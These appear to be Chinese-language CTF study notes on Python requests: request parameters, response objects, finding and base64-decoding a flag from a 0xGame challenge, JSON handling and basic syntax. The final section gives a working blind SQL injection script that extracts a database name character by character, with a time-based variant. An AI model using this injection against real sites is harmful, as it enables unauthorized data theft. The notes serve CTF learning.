# 02 · Python / requests（task2）

## 一、requests 四件套

```python
import requests

res = requests.get(url,  params={...}, headers={...}, cookies={...})   # GET
res = requests.post(url, data={...},   headers={...}, cookies={...})   # POST
```

| 参数 | 用途 | 对应 |
|---|---|---|
| `params` | URL 查询参数 | GET |
| `data` | 请求体（表单） | POST |
| `json` | 请求体（JSON） | POST（`Content-Type: application/json`） |
| `headers` | 请求头 | 改头 |
| `cookies` | Cookie | 会话 |
| `files` | 文件上传 | multipart |

**易错**：`params`（GET） vs `data`（POST），别混。

## 二、响应对象

```python
res.text            # 正文（str）
res.content         # 正文（bytes）
res.headers         # 响应头（dict-like）
res.status_code     # 状态码
res.cookies         # 服务器 set 的 cookie
res.json()          # 解析 JSON → dict
res.url             # 最终 URL
res.history         # 重定向历史
```

**抓 flag 常看 `res.headers`**（后端把 flag 放响应头）。

### 2.1 Response 对象 ≠ dict

这是最常踩的一脚。`res` 是 requests 的**响应对象**，不是字典：

```python
r = S.post(url, data={"vid": 7})
r["data"]                # TypeError: 'Response' object is not subscriptable
r = S.post(url, data={"vid": 7}).json()   # 解析后才变成 dict，才能下标
```

| 写法 | 类型 | 能不能 `r["x"]` |
|---|---|---|
| `r = S.post(...)` | `Response` | 不能 |
| `r = S.post(...).json()` | `dict` | 能 |

### 2.2 不知道 flag 在哪一层：先打印，再定位

**不要凭感觉写 `r["data"]["flag"]`。** 顺序永远是「先打印 → 再定位 → 最后才写死路径」：

```python
r = S.post(url, data={...})

print(r.status_code)         # 第 1 步：通不通
print(r.text)                # 第 2 步：看生肉（原始 JSON 字符串）
j = r.json()                 # 第 3 步：解析
print(type(j))               # 第 4 步：是 dict 还是 list
print(list(j.keys()))        # 第 5 步：顶层有哪些 key
print(list(j["data"].keys()))    # 第 6 步：逐层往下钻
```

真实例子（0xGame 投票题）：

```
r.text  → {"ok": true, "data": {"votes": 310, "name": "永雏塔菲", "flag": "MHhH..."}}
j.keys()            → ['ok', 'data']
j["data"].keys()    → ['votes', 'name', 'flag']
j["data"]["flag"]   → 'MHhHYW1le3YwdGVfNF90YWYzaV9UaGFuazVfbWlAb30='
```

**递归走一遍**（不想一层层钻时）：

```python
def walk(o, path="r"):
    if isinstance(o, dict):
        for k, v in o.items(): walk(v, path + "[" + repr(k) + "]")
    elif isinstance(o, list):
        for i, v in enumerate(o): walk(v, path + "[" + str(i) + "]")
    else:
        print(path, "=", repr(o))       # 叶子：真正能取到值的路径

walk(j)
# r['ok'] = True
# r['data']['votes'] = 310
# r['data']['flag'] = 'MHhH...'
```

**模糊捞**（连 key 名都不知道时，按「长得像 flag」筛）：

```python
def hunt(o, path="r"):
    if isinstance(o, dict):
        for k, v in o.items(): hunt(v, path + "." + k)
    elif isinstance(o, list):
        for i, v in enumerate(o): hunt(v, path + "[" + str(i) + "]")
    elif isinstance(o, str) and len(o) > 16 and " " not in o:
        print("可疑:", path, "=", repr(o))
```

**防崩写法**：确认结构后，正式脚本仍用 `.get()` 兜一手：

```python
if j.get("ok"):
    print(base64.b64decode(j["data"]["flag"]).decode())
```

### 2.3 为什么一堆 flag 要 `b64decode`

不是规定，是**打印出来看出来的**：`flag` 字段的值以 `MHhH` 开头、以 `=` 结尾 —— 那是 base64 的形状。`b64encode` / `b64decode` 互为逆运算：

```python
import base64
base64.b64encode(b"0xGame{abc}")        # b'MHhHYW1le2FiY30='
base64.b64decode("MHhHYW1le2FiY30=")    # b'0xGame{abc}'
```

`b64decode` 返回 **bytes**，要 `.decode()` 才成字符串。

> 前缀速查：`0xGame{` → `MHhHYW1l`、`flag{` → `ZmxhZ`、`SYC{` → `U1lD`

## 三、JSON ↔ Python

```python
import json

json.dumps({"a": 1})        # Python dict → JSON 字符串
json.loads('{"a":1}')       # JSON 字符串 → Python dict

requests.post(url, json={"a":1})   # 自动序列化 + 设 Content-Type
res.json()                          # 自动解析
```

**JS ↔ Python 对照**：
| JavaScript | Python (requests) |
|---|---|
| `body: JSON.stringify({...})` | `json={...}` |
| `body: new URLSearchParams({...})` | `data={...}` |
| `body: new FormData()` | `files={...}` |

## 五、字符串格式化

```python
name = "小明"
f"姓名：{name}"                    # f-string
"姓名：%s" % name                  # % 格式化
"姓名：{}".format(name)            # format
```

## 六、基础语法易错

| 点 | 说明 |
|---|---|
| **缩进** | 2空格/4空格/制表符都合法，但**不能混用** |
| **range** | `range(1,3)` = 1,2（**含头不含尾**） |
| **return** | 交付结果；不写返回 `None`（≠ print） |
| **//** （地板除） | `7//2 = 3` |
| **真值** | `0`、`""`、`[]`、`{}`、`None` 都是 **False** |
| **类型** | `"123" + 1` 报错，要 `int("123") + 1` |

## 七、盲注脚本模板

```python
import requests

url = "http://target/?id=1'"
def check(payload):
    r = requests.get(url + payload)
    return "正常特征" in r.text          # 布尔盲注：看特征

# 猜长度
length = 0
for L in range(1, 30):
    if check(" and length(database())=%d--+" % L):
        length = L; break

# 逐字符（二分）
name = ""
for pos in range(1, length + 1):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if check(" and ascii(substr(database(),%d,1))>%d--+" % (pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    name += chr(lo)
print(name)

# 时间盲注版：check 里用 if(条件, sleep(5), 1)，判断耗时 > 4.5s
```
